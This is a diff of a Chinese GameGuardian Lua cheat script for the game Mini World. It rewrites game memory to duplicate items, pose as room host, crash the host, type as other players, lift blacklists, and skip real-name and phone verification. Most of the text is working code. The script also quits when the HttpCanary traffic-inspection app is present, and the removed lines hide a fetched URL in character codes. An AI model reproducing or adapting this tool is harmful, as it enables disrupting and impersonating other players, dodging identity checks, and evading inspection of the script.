@@ -4,57 +4,132 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-Y=gg.makeRequest(string.char(104,116,116,112,115,58,47,47,118,49,46,104,105,116,111,107,111,116,111,46,99,110,47)).content
---获取云端数据
-Q=string.match(Y,string.char(104,105,116,111,107,111,116,111,40,46,43,41,116,121,112,101))
---模式匹配他们中的一切字符
-F=string.gsub(Q,string.char(34,58,34),string.char())
-K=string.gsub(F,string.char(34,44,34),string.char())
-
- wljbht = "http://www.iyuji.cn/iyuji/s/TU1KZ0R1ZlRyMlB1Z1ZzNll0RTZ4Zz09/1624819790885671"
+wljbht = "http://www.iyuji.cn/iyuji/s/YlJqdHg4aXBWcDhMUlQ5NHRMT1BuQT09/1635659735014141"
   BX = gg.makeRequest(wljbht).content
     qwtjqdcs = BX:match("<div class=\"read_txt\">阅读&nbsp; (.-)</div>")
-    gg.alert("换了个新源码凉情专区，拜拜了您勒")
+    
+
+function SearchWrite(Search, Write, Type)
+    gg.clearResults()
+    gg.setVisible(false)
+    gg.searchNumber(Search[1][1], Type)
+    local count = gg.getResultCount()
+    local result = gg.getResults(count)
+    gg.clearResults()
+    local data = {} --用于保存有效结果
+    local base = Search[1][2] --(0 或主特征码后三位)(用于计算相对主特征码的偏移)
+    
+   if (count > 0) then
+        for i, v in ipairs(result) do
+            v.isUseful = true --保存搜索到的地址信息(全部设定为true)
+        end
+        
+        for k=2, #Search do
+            local tmp = {}
+            local offset = Search[k][2] - base --特征码偏移(副特征码后三位 - 主特征码后三位)
+            local num = Search[k][1] --特征码
+            
+            for i, v in ipairs(result) do
+                tmp[#tmp+1] = {} --添加项目
+                tmp[#tmp].address = v.address + offset  --项目地址为主特征码地址+偏移量
+                tmp[#tmp].flags = v.flags  --项目数据类型
+            end
+            
+            tmp = gg.getValues(tmp) --刷新项目值
+            
+            for i, v in ipairs(tmp) do
+                if ( tostring(v.value) ~= tostring(num) ) then --判断项目值与其他特征码是否一致
+                    result[i].isUseful = false --不符合过滤条件设定为false
+                end
+            end
+        end
+  
+        for i, v in ipairs(result) do
+            if (v.isUseful) then --筛选出符合条件的主特征码地址
+                data[#data+1] = v.address
+            end
+        end
+        --------------内存写入
+        if (#data > 0) then
+           gg.toast("检测到"..#data.."条外来数据")
+           local t = {}
+           local base = Search[1][2]
+           for i=1, #data do
+               for k, w in ipairs(Write) do
+                   offset = w[2] - base
+                   t[#t+1] = {}
+                   t[#t].address = data[i] + offset
+                   t[#t].flags = Type
+                   t[#t].value = w[1]
+                   --- 冻结项目添加到列表
+                   if (w[3] == true) then
+                       local item = {}
+                       item[#item+1] = t[#t]
+                       item[#item].freeze = true
+                       gg.addListItems(item)
+                   end
+                   --- 不需要可以注释掉
+               end
+           end
+           gg.setValues(t)
+          -- gg.toast("已修改"..#t.."条数据")
+          -- gg.addListItems(t)
+        else
+            gg.toast("not found", false)
+            return false
+        end
+    else
+        gg.toast("Not Found")
+        return false
+    end
+end
+
+
+
+--vpn
+file,err=io.open("/storage/emulated/0/Android/data/com.guoshi.httpcanary")
+jg=err:match("%((.-)%)")
+if jg=="No such file or directory" then 
+ else
+print("卸载抓包工具再运行脚本") 
+os.exit() 
+while true do
+  end
+end
 
 
 
 
-   function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
+
+
+
+
+function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end 
 a = io.open("/sdcard/凉情配置文件.txt", "rb") if a == nil then user = "" pass = "" else
-a = io.open("/sdcard/凉情配置文件.txt"):read("*a") zh = a:match("👣(.-)👣") if a == "" then zh = "" end end
-dI=gg.prompt({"❤️输入你的迷你号❤️","开启网抑云✔️"},{[1] = zh,[2] = nil},{[1] = "number",[2] = "checkbox"}) if dI[2] ==true then  YY998() end   zh = dI[1]  io.open("/sdcard/凉情配置文件.txt", "w") io.open("/sdcard/凉情配置文件.txt", "w"):write("👣" .. zh .. "👣"):close()
+a = io.open("/sdcard/凉情配置文件.txt"):read("*a") lq = a:match("✔️(.-)✔️") if a == "" then zh = "" end end
+ dI=gg.prompt({"🐬输入你的迷你号🐬","推荐音乐❤️"},{[1] = lq,[2] = nil},{[1] = "number",[2] = "checkbox"}) if dI[2] ==true then  YY998() end   lq = dI[1]  io.open("/sdcard/凉情配置文件.txt", "w") io.open("/sdcard/凉情配置文件.txt", "w"):write("✔️" .. lq .. "✔️"):close()
 b=a 
-gg.toast("当前迷你号:"..b.."为了她，你放弃一切，值得吗？")
+gg.toast("当前迷你号:"..b.."其实...她可能真的爱你... ")
 local bx=os.date("%Y年%m月%d日%H时%M分%S秒") print(bx)
-bqt={"🍬","🧸","🧊","🍁","☑️","🌟","💔","🎄","🕎","⚛️","💯","✔️","💟","♓️","⭐","💥",}
+bqt={"🍬","🧸","🍓","🍁","🎡","🐶","🐥","✡","❄️","👻","⭐","🍺","🍀","🧊","💫","⚡",}
 function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
 function SearchWrite(tb1, tb2, dataType, Name) local lt1={} local lt2={} local mm1={["主特征码"] = tb1[1][1],["类型"] = dataType } table.insert(lt1,1,mm1)   for i=2 , #tb1 do     local mm2={["副特征码"] = tb1[i][1],["偏移"] = tb1[i][2]}     table.insert(lt1,i,mm2)   end   for i=1 , #tb2 do     if tb2[i][2]~=nil then       local mm3={["修改"] = tb2[i][1],["偏移"] = tb2[i][2]}       table.insert(lt2,i,mm3)      else       local mm3={["修改"] = false,["偏移"] = tb2[i][1]}       table.insert(lt2,i,mm3)     end   end   LongTao(lt1, lt2 ) end  function LongTao(Search, Write)   gg.clearResults()   gg.setVisible(false)   lx=Search[1]["类型"]   gg.searchNumber(Search[1]["主特征码"], lx)   local count = gg.getResultCount()   local result = gg.getResults(count)   gg.clearResults()   local data = {}   if (count > 0) then     gg.toast("共搜索 "..count.." 条数据")     for i, v in ipairs(result) do       v.isUseful = true     end     for k=2, #Search do       local tmp = {}       local num = Search[k]["副特征码"]       if Search[k]["类型"]~= nil then            lx =Search[k]["类型"]          else            lx = Search[1]["类型"]         end       for i, v in ipairs(result) do         tmp[#tmp+1] = {}         tmp[#tmp].address = v.address + Search[k]["偏移"]         tmp[#tmp].flags = lx       end       tmp = gg.getValues(tmp)       for i, v in ipairs(tmp) do         if ( tostring(v.value) ~= tostring(num) ) then           result[i].isUseful = false         end       end     end     for i, v in ipairs(result) do       if (v.isUseful) then         data[#data+1] = v.address       end     end     if (#data > 0) then       local t = {}       for i=1, #data do         for k, w in ipairs(Write) do           if w["类型"] ~= nil then              lx = w["类型"]            else              lx = Search[1]["类型"]           end           t[#t+1] = {}           t[#t].address = data[i] + w["偏移"]           t[#t].flags = lx           if (w["修改"]~=nil) and (w["修改"]~=false) then             t[#t].value = w["修改"]             gg.setValues(t)             if (w["冻结"] == true) then               local item = {}               item[#item+1] = t[#t]               item[#item].freeze = w["冻结"]               gg.addListItems(item)             end           end         end       end       gg.loadResults(t)       gg.toast("共偏移η"..#t.." 条数据ΔΘ")      else       gg.toast("未定位到数据！")       return false     end    else     gg.toast("未定位到数据！")     return false   end end    local app = {} function Assert(data) if data == nil or data == "" or data == "nil" then return false else return true end end function mearrass(memory, array) if Assert(memory) and Assert(array) then return true else return false end end function typetab(array, type) local datatype = {} for i = 1, #array do if Assert(array[i].type) then table.insert(datatype, i, array[i].type) else if Assert(type) then table.insert(datatype, i, type) else return false end end end return true, datatype end function app.memorysearch(memory, array, type) gg.setVisible(false) local isok = mearrass(memory, array) if isok then local isok, datatype = typetab(array, type) if isok then if Assert(array[1].hv) then gg.clearResults() gg.setRanges(memory) gg.searchNumber(array[1].lv .. "~" .. array[1].hv, datatype[1]) else gg.clearResults() gg.setRanges(memory) gg.searchNumber(array[1].lv, datatype[1]) end if gg.getResultCount() == 0 then return false else local tab = {} local data = gg.getResults(gg.getResultCount()) gg.clearResults() for i = 1, #data do data[i].isok = true end for i = 2, #array do local t = {} local offset = array[i].offset for x = 1, #data do t[#t + 1] = {} t[#t].address = data[x].address + offset t[#t].flags = datatype[i] end local t = gg.getValues(t) for z = 1, #t do if Assert(array[i].hv) then if tonumber(t[z].value) < tonumber(array[i].lv) or tonumber(t[z].value) > tonumber(array[i].hv) then  data[z].isok = false end else if tostring(t[z].value) ~= tostring(array[i].lv) then data[z].isok = false end end end end for i = 1, #data do if data[i].isok then tab[#tab + 1] = data[i].address end end if #tab > 0 then return true, tab else return false end end else print("type参数错误") gg.toast("type参数错误") os.exit() end else print("memory or array参数错误") gg.toast("memory or array参数错误") os.exit() end end function app.memoryread(addr, type) local t = {} t[1] = {} t[1].address = addr t[1].flags = type if #t > 0 then return true, gg.getValues(t)[1].value else return false end end function app.memorywrite(addr, type, value, freeze) local t = {} t[1] = {} t[1].address = addr t[1].flags = type t[1].value = value if #t > 0 then if Assert(freeze) then t[1].freeze = freeze return gg.addListItems(t) else return gg.setValues(t) end else return false end end
 function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
 function PS() end function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end
 function Main()  local sjbq=bqt[math.random(1,#bqt)] SY = gg.choice({
-    [1] = sjbq.."🐬❤️房主功能❤️🐬"..sjbq,
-    [2] = sjbq.."🐬❤️联机功能❤️🐬"..sjbq,
-    [3] = sjbq.."🐬❤️炸图功能❤️🐬"..sjbq,
-    [4] = sjbq.."🐬❤️特效功能❤️🐬"..sjbq,
-    [5] = sjbq.."🐬❤️️狙击功能❤️🐬"..sjbq,
-    [6] = sjbq.."🐬❤️特别感谢❤️🐬"..sjbq,
-      [7] = sjbq.."🐬❤️播放音乐 ❤️🐬"..sjbq,
-    [15] = sjbq.."🐬🌺️退 出 脚 本🌺🐬"..sjbq,
-},2018,os.date("❤️凉情:".."『"..K.."』❤️\n🧊当前时间%Y年%m月%d日%H时%M分%S秒🧊"))
-if SY==15 then Exited() end
+       [1] = sjbq.."𒅒🔰房主专区𒅒🔰"..sjbq,
+    [2] = sjbq.."𒅒🔰联机专区𒅒🔰"..sjbq,
+    [3] = sjbq.."𒅒🔰炸图专区𒅒🔰"..sjbq,
+    [4] = sjbq.."𒅒🔰特效专区𒅒🔰"..sjbq,
+    [5] = sjbq.."𒅒🔰狙击专区𒅒🔰"..sjbq,
+    [6] = sjbq.."𒅒🔰️特别感谢𒅒🔰"..sjbq,
+     [7] = sjbq.."𒅒🔰切换专区𒅒🔰"..sjbq,
+      [8] = sjbq.."𒅒🔰音乐专区 𒅒🔰"..sjbq,
+        [9] = sjbq.."𒅒🔰作者专区𒅒🔰"..sjbq,
+        [10] = sjbq.."𒅒🔰科技专区𒅒🔰"..sjbq,
+    [15] = sjbq.."𒅒🔰退出辅助𒅒🔰"..sjbq,
+},2018,os.date("我的辅助还未做出来，先用这个吧"))
+if SY==15 then Exit() end
 if SY==1 then Main1() end
 if SY==2 then Main2() end
 if SY==3 then Main3() end
@@ -62,7 +137,13 @@ if SY==4 then Main4() end
 if SY==5 then Main5() end
 if SY==6 then Main6() end 
 if SY==7 then Main7() end
+if SY==8 then Main8() end
+if SY==9 then Main9() end
+if SY==10 then Main10() end
 FX1=0 end
+
+
+
 
 
 
@@ -90,7 +171,7 @@ SN = gg.multiChoice({
 "𒅒🧊武器附魔𒅒🧊",
 "𒅒🧊工具附魔𒅒🧊",
 "𒅒🧊夕阳西下(锁时间)𒅒🧊",
-"𒅒🧊开40人𒅒🧊",
+"𒅒❤️40人房间𒅒🧊",
 "𒅒🧊剑无限cd𒅒🧊",
 "𒅒🧊钩爪喷子𒅒🧊",
 "𒅒🧊第一个无限耐久𒅒🧊",
@@ -119,7 +200,8 @@ SN = gg.multiChoice({
 "𒅒🧊秒生蛋𒅒🧊",
 "𒅒🧊添加坐骑𒅒🧊",
 "𒅒🧊鸡掉落坐骑蛋𒅒🧊",
-"𒅒🧊取消身份证验证𒅒🧊",
+"𒅒🧊无限跳(游泳飞行)𒅒🧊",
+"𒅒🧊单机聊天𒅒🧊",
 "🧡返 回 主 页🧡",
  }, nil, "🌺为什么说抱歉....明明是我不对🌺")
 if SN == nil then else
@@ -164,7 +246,8 @@ if SN[38]==true then     asms11() end
 if SN[39]==true then     asms12() end
 if SN[40]==true then     asms13() end
 if SN[41]==true then     asms14() end
-if SN[42]==true then	 Main() end
+if SN[42]==true then     asms15() end
+if SN[43]==true then	 Main() end
 end
 FX=0 end
 
@@ -182,16 +265,58 @@ FX=0 end
 
 
 function wz1()
+gg.toast("请选择复刻物品开关")
+F = gg.alert("🔰请选择复刻第一格物品｛开 关｝🔰","🔵开🔵","🔴关🔴")
+ if  F~=1 and F~=2 then
+  gg.toast("你未选择开关默认取消")
+    gg.toast("📌你未选择｛开 关｝")
+  else 
+  end
+if  F== 1 then
+ while  true do 
+    gg.sleep(100)
+    gg.toast("🔰功 能 指 南🔰\n📝[开启:需要将快捷栏第一格清空]\n📝[使用:房主无限制，别人房间需要长按入箱再拿出即可]\n📝[恢复:需要第一格有俩百物品]\n❗不按指南来会失败单点修改器继续")
+if gg.isVisible(true) then 
+gg.setVisible(false)   
 qmnb = {
 {["memory"] = 4},
-{["name"] = "伪房主"},
-{["value"] = 11522, ["type"] = 4},
-{["lv"] = 11014, ["offset"] = 4, ["type"] = 4},}
+{["name"] = "第一格物品复刻开启"},
+{["value"] = 945804460, ["type"] = 4},
+{["lv"] = 1000, ["offset"] = -4, ["type"] = 4},
+{["lv"] = -1, ["offset"] = 4, ["type"] = 4},
+}
 qmxg = {
-{["value"] = 3, ["offset"] = -0x5D8, ["type"] = 4},}
+{["value"] = 945,804,564, ["offset"] = 0, ["type"] = 4, ["freeze"] = true},
+}
+xqmnb(qmnb)
+ while  true do 
+if gg.isVisible(true) then 
+gg.setVisible(false)
+gg.clearResults()
+Main0()
+end
+end
+end
+end
+elseif F == 2 then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "物品复刻恢复"},
+{["value"] = 945804388, ["type"] = 4},
+{["lv"] = 1000, ["offset"] = -4, ["type"] = 4},
+{["lv"] = -1, ["offset"] = 4, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 945,804,388, ["offset"] = 0, ["type"] = 4, ["freeze"] = false}
+}
 xqmnb(qmnb)
 gg.clearResults()
 end
+end
+function Exit()
+os.exit()
+end
+
 
 
 
@@ -279,33 +404,33 @@ end
 
 function a5()
 o2= gg.choice({
-    "𒅒🧡化石龙🧡𒅒",
-    "𒅒🧡机灵飞鼠🧡𒅒",
-    "𒅒💜瑞祥麒麟💜𒅒",
-    "𒅒💜陆行鸟💜𒅒",
-    "𒅒♨️大白象 ♨️𒅒",    
-    "𒅒 ♨️️超能海豹 ♨️𒅒",
-    "𒅒 💯舞狮猫猫 💯𒅒",
-    "𒅒 💯星河天马 💯𒅒",
-    "𒅒 ❗桃香扇缘 ❗𒅒",
-    "𒅒 ❗深渊咆哮 ❗𒅒",
-    "𒅒 🔸皎月仙宫 🔸𒅒",
-    "𒅒 🔸冰雪传说 🔸𒅒",   
-    "𒅒 🔷缤纷幻想 🔷𒅒",
-    "𒅒 🔷福运哞哞 🔷𒅒",
-    "𒅒 ❌浮游山海 ❌𒅒",
-    "𒅒 ❌镜花水月 ❌𒅒",
-    "𒅒 ⭕️鹿王本身 ⭕𒅒", 
-     "𒅒 ⭕️精灵南瓜车 ⭕𒅒", 
-      "𒅒🔵️竹 蜻 蜓 🔵𒅒",   
-      "𒅒 🔵️曦光绘梦 🔵𒅒",  
-      "𒅒 🔶️裂空机甲 🔶𒅒",
-      "𒅒 🔶️星河机甲 🔶𒅒",
-      "𒅒 ⚜️️无敌旋风 ⚜️𒅒",
-     "𒅒 ⚜️️环海洛洛 ⚜️𒅒",
-     "𒅒 🌐️环海洛洛-进阶 🌐𒅒",
-     "𒅒 🌐自定义坐骑 🌐𒅒",
-    "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("𒅒失去了太多，都不知道活着为了谁𒅒"))
+    "𒅒🧊化石龙🧊𒅒",
+    "𒅒🧊机灵飞鼠🧊𒅒",
+    "𒅒🧊瑞祥麒麟🧊𒅒",
+    "𒅒🧊陆行鸟🧊𒅒",
+    "𒅒🧊️大白象🧊𒅒",    
+    "𒅒🧊️超能海豹🧊𒅒",
+    "𒅒🧊舞狮猫猫🧊𒅒",
+    "𒅒🧊星河天马🧊𒅒",
+    "𒅒🧊桃香扇缘🧊𒅒",
+    "𒅒🧊深渊咆哮🧊𒅒",
+    "𒅒🧊皎月仙宫🧊𒅒",
+    "𒅒🧊冰雪传说🧊𒅒",   
+    "𒅒🧊缤纷幻想🧊𒅒",
+    "𒅒🧊福运哞哞🧊𒅒",
+    "𒅒🧊浮游山海🧊𒅒",
+    "𒅒🧊镜花水月🧊𒅒",
+    "𒅒🧊️鹿王本身🧊𒅒", 
+     "𒅒🧊️精灵南瓜车🧊𒅒", 
+      "𒅒🧊️竹 蜻 蜓🧊𒅒", 
+      "𒅒🧊曦光绘梦️🧊𒅒", 
+      "𒅒🧊️裂空机甲🧊𒅒", 
+      "𒅒🧊️星河机甲🧊𒅒", 
+      "𒅒🧊环海诺诺🧊𒅒", 
+      "𒅒🧊尼东若若🧊𒅒", 
+      "𒅒🧊️虚空龙祖🧊𒅒",          
+      "𒅒🧊️繁花夜明🧊𒅒", 
+       "𒅒🎡返 回 主 页🎡𒅒",},2018,os.date("失去了太多....都不知道活着为了谁𒅒"))
 if o2==1 then o=3432 o4() end
 if o2==2 then o=3435 o4() end
 if o2==3 then o=3438 o4() end
@@ -328,32 +453,11 @@ if o2==19 then o=4510 o4() end
 if o2==20 then o=4515 o4() end
 if o2==21 then o=4518 o4() end
 if o2==22 then o=4521 o4() end
-if o2==23 then o=4523 o4() end
-if o2==24 then o=4525 o4() end
-if o2==25 then o=4526 o4() end
-if o2==26 then  zdy() end
+if o2==23 then o=4526 o4() end
+if o2==24 then o=4529 o4() end
+if o2==25 then o=4533 o4() end
+if o2==26 then o=4537 o4() end
 XGCK=-1 end
-
-function zdy()
-aba6 = gg.prompt({"请输入坐骑代码"}
-,{[1]=4526},{[1]="number"})[1]
-qmnb = {
-{["memory"] = 4},
-{["name"] = "坐骑"},
-{["value"] = 4842495500454461440, ["type"] =32 },
-{["lv"] = 1127481344, ["offset"] = 4, ["type"] = 4},
-{["lv"] = 1106247680, ["offset"] = 0x14, ["type"] = 4},
-{["lv"] = 1065353216, ["offset"] = 0x50, ["type"] = 4},
-{["lv"] = 1065353216, ["offset"] = -0x8, ["type"] = 4},
-}
-qmxg = {
-{["value"] = aba6, ["offset"] = 0xD4, ["type"] = 4, ["freeze"] = true},
-{["value"] = 16777472, ["offset"] = -0x34, ["type"] = 4, ["freeze"] = true},
-}
-xqmnb(qmnb)
-gg.clearResults()
-end
-
 function o4()
 qmnb = {
 {["memory"] = 4},
@@ -1865,22 +1969,30 @@ end
 
 function asms14()
 gg.clearResults()
-	 gg.setRanges(4)
-	 gg.searchNumber("16777472;6500;1440", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
-	 gg.searchNumber("16777472", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
-	 jg=gg.getResults(400)
-	 sl=gg.getResultCount()
-	 if sl>400 then sl=400 end
-	 for i = 1, sl do
-	 	 dzy=jg[i].address
-	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_DWORD,freeze = true,value = 16777216}})
-	 end
-	 gg.toast("滚")
-	 gg.clearResults()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "踏空跳"},
+{["value"] = 515396075740, ["type"] = 32},
+{["lv"] = 60, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 180, ["offset"] = -12, ["type"] = 4},
+{["lv"] = 120, ["offset"] = -4, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 257, ["offset"] = 128, ["type"] = 4, ["freeze"] = true},
+}
+xqmnb(qmnb)
+gg.clearResults()
 end
 
-
-
+function asms15()
+gg.setRanges(4)
+local dataType = 4
+local tb1 = {{151552,1130889216} }
+local tb2 = {{16777472, 32,true  }, }
+SearchWrite(tb1, tb2, dataType)
+gg.toast("单机聊天")
+	 gg.clearResults()
+end
 
 function Main2() 
 SN = gg.multiChoice({
@@ -1934,7 +2046,7 @@ SN = gg.multiChoice({
 '𒅒🧊正极走路𒅒🧊',
 '𒅒🧊正极走路恢复𒅒🧊',
 '𒅒🧊添加坐骑𒅒🧊',
-'𒅒🧊伪飞行(有些手机不能用)𒅒🧊',
+'𒅒🧊大厅黑色(xs)𒅒🧊',
 "𒅒🧊临时改名𒅒🧊①",
 "𒅒🧊临时改名②𒅒🧊",
 "𒅒🧊隐身(高度7)𒅒🧊",
@@ -1955,17 +2067,46 @@ SN = gg.multiChoice({
 '𒅒🧊能量剑变大𒅒🧊',
 '𒅒🧊能量剑变小𒅒🧊',
 '𒅒🧊神灵附体𒅒🧊',
-'𒅒🧊强制返回𒅒🧊',
+'𒅒🧊哟西哟西𒅒🧊',
 '𒅒🧊卡崩自己(智障专用)𒅒🧊',
 '𒅒🧊穿墙攻击𒅒🧊',
 '𒅒🧊联机取物品.伪房主(永远)𒅒🧊',
 '𒅒🧊加好友界面𒅒🧊',
 '𒅒🧊极限生存开联机𒅒🧊',
-'𒅒🧊伪飞行𒅒🧊',
+'𒅒🧊伪.飞行𒅒🧊',
 '𒅒🧊联机添加炸弹𒅒🧊',
 '𒅒🧊领取无限炸弹𒅒🧊',
+'𒅒🧊狙击镜锁定(打开时开启)𒅒🧊',
+'𒅒🧊联机切换队伍.查看信用𒅒🧊',
+'𒅒🧊打开不同商店𒅒🧊',
+'𒅒🧊联机修改皮肤(新，要有妙妙)𒅒🧊',
+'𒅒🧊仙人掌改钢琴(编辑器)𒅒🧊',
+'𒅒🧊联机添加特殊武器𒅒🧊',
+'𒅒🧊开发者背包𒅒🧊',
+'𒅒🧊和迷你队长聊天𒅒🧊',
+'𒅒🧊取消黑名单(已修复)𒅒🧊',
+'𒅒🧊强大如我.勋章(凉情原创)𒅒🧊',
+'𒅒🧊创造背包(电脑版)𒅒🧊',
+'𒅒🧊添加火箭背包𒅒🧊',
+'𒅒🧊开发者编辑地图𒅒🧊',
+'𒅒🧊替别人打字(原创)𒅒🧊',
+'𒅒🧊切换视角(先进地图打开介绍拍照)𒅒🧊',
+'𒅒🧊取消实名认证𒅒🧊',
+'𒅒🧊家园植物.勋章𒅒🧊',
+'𒅒🧊无限星星.星星礼盒𒅒🧊',
+'𒅒🧊自定义模型工具(配合创造)𒅒🧊',
+'𒅒🧊改炸弹(配合无限领取)𒅒🧊',
+'𒅒🧊复制方块(编辑器内)𒅒🧊',
+'𒅒🧊联机箱子无限物品𒅒🧊',
+'𒅒🧊卡崩房主𒅒🧊',
+'𒅒🧊包围太阳(黑暗)𒅒🧊',
+'𒅒🧊包围太阳(迪迦)𒅒🧊',
+'𒅒🧊白色天空𒅒🧊',
+'𒅒🧊自定义添加任何东西𒅒🧊',
+'𒅒🧊动态发图片𒅒🧊',
+'𒅒🧊解锁所有物品𒅒🧊',
 "💯返 回 主 页💯",
- }, nil, "❌这次我输了，输的满盘皆输.....❌")
+ }, nil, "你是我想保护的人啊.....")
 if SN == nil then else
 if SN[1]==true then	 b1() end
 if SN[2]==true then	 b2() end
@@ -2047,7 +2188,36 @@ if SN[77]==true then	 yf43() end
 if SN[78]==true then	 yf44() end
 if SN[79]==true then	 yf45() end
 if SN[80]==true then	 yf46() end
-if SN[81]==true then	 Main() end
+if SN[81]==true then	 yf47() end
+if SN[82]==true then	 yf48() end
+if SN[83]==true then	 yf49() end
+if SN[84]==true then	 yf50() end
+if SN[85]==true then	 yf51() end
+if SN[86]==true then	 yf52() end
+if SN[87]==true then	 yf53() end
+if SN[88]==true then	 yf54() end
+if SN[89]==true then	 yf55() end
+if SN[90]==true then	 yf56() end
+if SN[91]==true then	 yf57() end
+if SN[92]==true then	 yf58() end
+if SN[93]==true then	 yf59() end
+if SN[94]==true then	 yf60() end
+if SN[95]==true then	 yf61() end
+if SN[96]==true then	 yf62() end
+if SN[97]==true then	 yf63() end
+if SN[98]==true then	 yf64() end
+if SN[99]==true then	 yf65() end
+if SN[100]==true then	 yf66() end
+if SN[101]==true then	 yf67() end
+if SN[102]==true then	 yf68() end
+if SN[103]==true then	 yf69() end
+if SN[104]==true then	 yf70() end
+if SN[105]==true then	 yf71() end
+if SN[106]==true then	 yf72() end
+if SN[107]==true then	 yf73() end
+if SN[108]==true then	 yf74() end
+if SN[109]==true then	 yf75() end
+if SN[110]==true then	 Main() end
 end
 FX=0 end
 
@@ -3203,7 +3373,7 @@ function lqc11()
 qmnb = {
 {["memory"] = 4},
 {["name"] = "篮球模式"},
-{["value"] =1416177161 , ["type"] = 4},
+{["value"] =lq , ["type"] = 4},
 {["lv"] = 0, ["offset"] = -280, ["type"] = 4},
 }
 qmxg = {
@@ -3217,16 +3387,13 @@ end
 
 
 function lqc12()
-b31a= gg.prompt({"输入房主迷你号"},{[1]=0},{[1]="number"})[1]
 qmnb = {
 {["memory"] = 4},
 {["name"] = "伪房主"},
-{["value"] = b31a, ["type"] = 4},
-{["lv"] = 2, ["offset"] = 44, ["type"] = 4},
-}
+{["value"] = 11522, ["type"] = 4},
+{["lv"] = 11014, ["offset"] = 4, ["type"] = 4},}
 qmxg = {
-{["value"] = 3, ["offset"] = 44, ["type"] = 4},
-}
+{["value"] = 3, ["offset"] = -0x5D8, ["type"] = 4},}
 xqmnb(qmnb)
 gg.clearResults()
 end
@@ -3545,24 +3712,13 @@ function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplit
 
 
 function yf18()
-mnh = gg.prompt({"请输入你的迷你号"}
-,{[1]=259537497},{[1]="number"})[1]
---
-
-
-
-
-
-
-
-
 mnmz = ":w"
 mnmc = gg.prompt({"请输入名字记得前面加个:"}
 ,{[1]=":"},{[1]="text"})[1]
 qmnb = {
 {["memory"] = 4},
 {["name"] = "."},
-{["value"] = mnh, ["type"] = 4},
+{["value"] = lq, ["type"] = 4},
 {["lv"] = 0, ["offset"] = -4, ["type"] = 4},
 {["lv"] = 0, ["offset"] = -8, ["type"] = 4},
 {["lv"] = 0, ["offset"] = -12, ["type"] = 4},
@@ -3770,13 +3926,17 @@ xqmnb(qmnb)
 gg.clearResults()end
 end
 function yf22()
+ qmnb = {
+    {["memory"] = 4},
+    {["name"] = "免手机号验证打字"},
+    {["value"] = 300.0, ["type"] = 64},
+    {["lv"] = 999.0, ["offset"] = 16, ["type"] = 64},
+  }
+  qmxg = {
+    {["value"] = 0, ["offset"] = 0, ["type"] = 64},
+  }
+  xqmnb(qmnb)
   gg.clearResults()
-  gg.setRanges(4)
-  gg.searchNumber("300.0;999.0:17", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
-  gg.searchNumber("300", gg.TYPE_DOUBLE, false, gg.SIGN_EQUAL, 0, -1)
-  gg.getResults(100)
-  gg.editAll("0", gg.TYPE_DOUBLE)
-  gg.toast("开启成功")
 end
 
 
@@ -3792,22 +3952,22 @@ if  F== 1 then
 qmnb = {
 {["memory"] = 16384},
 {["name"] = "摇头"},
-{["value"] =1120403456, ["type"] = 4},
-{["lv"] = 1127481344, ["offset"] = 12, ["type"] = 4},
